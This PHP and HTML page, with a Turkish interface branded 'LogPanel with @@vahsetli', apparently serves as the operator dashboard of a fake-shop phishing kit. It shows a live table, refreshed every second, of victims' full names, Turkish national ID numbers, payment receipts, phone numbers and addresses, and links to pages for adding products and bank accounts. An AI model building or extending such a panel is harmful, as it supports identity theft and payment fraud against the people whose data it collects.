<?php 
include '../db/koru.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LogPanel with @@vahsetli</title>
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <!-- Kendi CSS stil dosyanızı burada ekleyebilirsiniz -->
    <style>
        body {
            background-color: #333; /* Arka plan rengi karanlık mod için */
            color: #fff; /* Metin rengi karanlık mod için */
        }

        .navbar {
            background-color: #222; /* Navbar rengi karanlık mod için */
        }

        /* İsteğe bağlı olarak diğer öğelerin stillerini ayarlayabilirsiniz */
    </style>
</head>
<body>
    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-dark">
        <a class="navbar-brand" href="#">v/@@vahsetli</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <a class="nav-link" href="index.php">Anasayfa</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="urunler.php">Ürünler</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="urunekle.php">Ürün Ekle</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="banka.php">Bankalar</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="bankaekle.php">Banka Ekle</a>
                </li>
            </ul>
        </div>
    </nav>

    <!-- İçerik -->
    <div class="container mt-4">
        <table id="veriTablosu2" class="table table-dark">
            <thead>
                <tr>
                    <th>Ad Soyad</th>
                    <th>TC</th>
                    <th>Dekont</th>
                    <th>Posta Kodu</th>
                    <th>Telefon</th>
                    <th>Adres Başlığı</th>
                    <th>Adres</th>
                    <th>Zaman</th>
                    <th>İşlemler</th>
                </tr>
            </thead>
            <tbody>
            </tbody>
        </table>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        function verileriGuncelle2() {
            $.ajax({
                type: "GET",
                url: "verilerd.php",
                success: function(data) {
                    // Gelen verileri tabloya ekle
                    $("#veriTablosu2 tbody").html(data);
                }
            });
        }
        verileriGuncelle2();
        setInterval(verileriGuncelle2, 1000);
    </script>
</body>
</html>
